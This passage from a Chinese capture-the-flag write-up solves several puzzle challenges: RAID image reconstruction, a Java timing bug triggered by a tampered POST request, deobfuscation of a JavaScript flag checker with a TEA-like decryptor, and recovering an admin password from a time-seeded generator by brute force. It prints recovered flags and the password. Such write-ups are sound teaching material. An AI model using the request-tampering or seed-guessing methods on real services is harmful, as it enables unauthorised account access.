RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag RAID 0 \u00b6 \u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID. \u548c\u5757\u5927\u5c0f 128k \u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS $ file MyDisk.img MyDisk.img: SGI XFS filesystem data ( blksz 4096 , inosz 512 , v2 dirs ) \u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag \u52a9\u8bb0\u8bcd \u00b6 \u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a \u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002 \u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002 \u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 equals \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a try { TimeUnit . MILLISECONDS . sleep ( EQUALS_DURATION_MILLIS ); // 20ms // TODO: remove it since it is for debugging } catch ( InterruptedException e ) { throw new RuntimeException ( e ); } \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms \u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a var modified = 0 ; var before = System . nanoTime (); for ( var i = 0 ; i < input . length () && i < MAX_PHRASES && phrases . size () < MAX_PHRASES ; ++ i ) { var text = input . optString ( i , \"\" ). toLowerCase ( Locale . ENGLISH ); modified += phrases . add ( Phrase . create ( this . mnemonics , text , token )) ? 1 : 0 ; // \u8fd9\u91cc\u4f1a sleep } var after = System . nanoTime (); var duration = TimeUnit . MILLISECONDS . convert ( after - before , TimeUnit . NANOSECONDS ); if ( duration > FLAG1_DURATION_MILLIS ) { // 600ms token . addFlag ( 1 , flag -> output . put ( \"flag1\" , flag )); } \u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09 \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c \u4f46\u662f\u4e0d\u4f1a \u9a6c\u8d5b\u514b \u00b6 \uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 \u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003 \u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a \u8bfb\u56fe\u7247 \u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765 \u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a \u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5 \u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb \u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b \u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86 \u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a \u7136\u540e\u518d\u91cd\u590d4 \u7136\u540e\u91cd\u590d6 \u7136\u540e\u91cd\u590d4 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 \u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427 minecRaft \u00b6 kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002 \u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f \u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002 \u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002 \u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a < script src = \"jsm/miscs/flag.js\" ></ script > \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 gyflagh(input) \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js \u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b \u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 _0x381b() \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 ['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr'] \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 ['push'] \u548c ['shift'] \uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86 \u518d\u6765\u770b _0x2c9e() \u8fd9\u4e2a\u51fd\u6570\uff1a function _0x2c9e ( _0x49e6ff , _0x310d40 ) { const _0x381b4c = _0x381b (); return _0x2c9e = function ( _0x2c9ec6 , _0x2ec3bd ) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; let _0x4769df = _0x381b4c [ _0x2c9ec6 ]; return _0x4769df ; } , _0x2c9e ( _0x49e6ff , _0x310d40 ); } \u5176\u4e2d _0x381b4c \u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 _0x2c9e \uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a function _0x2c9e ( _0x2c9ec6 , ...) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; return lst [ _0x2c9ec6 ]; } 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 _0x22517d \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570 \u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 gyflagh \u51fd\u6570 function gyflagh ( _0x111955 ) { const _0x50051f = _0x22517d ; let _0x3b790d = _0x111955 [ _0x50051f ( 0x1a8 )]( _0x50051f ( 0x1b7 )); if ( _0x3b790d === _0x50051f ( 0x1aa )) return !! []; return ! []; } \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a function gyflagh ( ans ) { if ( ans [ \"encrypt\" ]( \"1356853149054377\" ) === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" ) { return true ; } return false ; } \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a String [ \"prototype\" ][ \"encrypt\" ] = function ( key ) { // key = \"1356853149054377\" const left = new Array ( 2 ); const right = new Array ( 4 ); let res = \"\" ; ans = escape ( this ); // this := ans right = [ 909456177 , 825439544 , 892352820 , 926364468 ] for ( var i = 0 ; i < ans [ \"length\" ]; i = i + 8 ) { left [ 0 ] = Str4ToLong ( ans [ \"slice\" ]( i , i + 4 )); left [ 1 ] = Str4ToLong ( ans [ \"slice\" ]( i + 4 , i + 8 )); code ( left , right ); res = res + ( LongToBase16 ( left [ 0 ]) + LongToBase16 ( left [ 1 ])); } return res ; // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c }; \u518d\u6765\u770b code \u51fd\u6570\uff0c\u6839\u636e << 4\u3001 ^\u3001 >>> 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a function dec ( left , right ) { for ( var i = 2654435769 * 32 ; i != 0 ;) { left [ 1 ] -= (( left [ 0 ] << 4 ^ left [ 0 ] >>> 5 ) + left [ 0 ] ^ i + right [ i >>> 11 & 3 ]); i -= 2654435769 ; left [ 0 ] -= (( left [ 1 ] << 4 ^ left [ 1 ] >>> 5 ) + left [ 1 ] ^ i + right [ i & 3 ]); } console . log ( left ); } \u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a 6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26: \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i} \u5bc6\u7801\u751f\u6210\u5668 \u00b6 \u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002 \u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002 \u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f \uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09 \u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c \u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a \u65f6\u95f4 \u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a \u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef \u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 $Z=CBDL7TjHu~mEX \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag p\ud83d\ude2dq \u00b6 \u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 \u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c \u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7 \u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5 \u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 librosa \uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb \u6587\u6863 \u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a y , sample_rate = librosa . load ( \"flag.mp3\" ) # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387 spectrogram = numpy . around ( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3 librosa . power_to_db ( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d librosa . feature . melspectrogram ( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31 y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type ) ) / quantize # \u9664\u4ee52 ) * quantize # \u4e58\u4ee52 \u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b numpy \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 array2gif \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif \u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f \u5b8c\u6574\u5730\u9006\u8fc7\u6765 \u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 gif2array \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 PIL.Image \uff1a from PIL import Image file = Image . open ( \"flag.gif\" ) try : while True : gif_data . append ( np . array ( file )) file . seek ( file . tell () + 1 ) except : print ( \"[+] Read gif file\" ) \u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a [[ - 58. - 48. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 26. ... - 58. - 58. - 58. ] [ - 58. - 40. - 16. ... - 58. - 58. - 58. ] ... [ - 58. - 42. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 32. ... - 58. - 58. - 58. ] [ - 58. - 46. - 34. ... - 58. - 58. - 58. ]] 